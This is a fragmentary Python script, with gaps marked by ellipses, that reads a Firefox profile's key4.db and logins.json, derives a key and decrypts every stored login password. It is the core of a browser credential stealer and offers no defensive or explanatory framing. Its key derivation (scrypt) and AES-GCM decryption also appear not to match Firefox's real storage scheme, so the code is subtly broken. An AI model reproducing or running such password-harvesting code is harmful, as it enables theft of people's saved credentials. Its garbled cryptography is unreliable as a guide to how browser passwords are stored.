...
def get_firefox_key(key_file_path):
    ...
    try:
        ...
        if not key_data:
            raise ValueError("No key data found in key4.db")

        encrypted_key, salt = key_data
        encrypted_key = binascii.unhexlify(encrypted_key)
        salt = binascii.unhexlify(salt)
        
        # Extract key using scrypt
        key = scrypt(encrypted_key, salt, 32, N=16384, r=8, p=1)
        return key
    except Exception as e:
        print(f"Error extracting Firefox key: {e}")
        return None

def decrypt_firefox_password(encrypted_password, key):
    """Decrypt Firefox passwords using AES."""
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password[:12])
        decrypted_pass = cipher.decrypt_and_verify(encrypted_password[12:-16], encrypted_password[-16:])
...
def extract_firefox_passwords(profile_path):
    """Extract passwords from Firefox's JSON and SQLite databases."""
    passwords = []
    logins_file_path = os.path.join(profile_path, 'logins.json')
    key_file_path = os.path.join(profile_path, 'key4.db')

    if not os.path.isfile(logins_file_path):
        print(f"Logins file not found at {logins_file_path}")
        return passwords
    ...
    with open(logins_file_path, 'r') as file:
        logins_data = json.load(file)

    key = get_firefox_key(key_file_path)
    if not key:
        return passwords
    ...
    for login in logins_data['logins']:
        ...
        password = decrypt_firefox_password(encrypted_password, key)
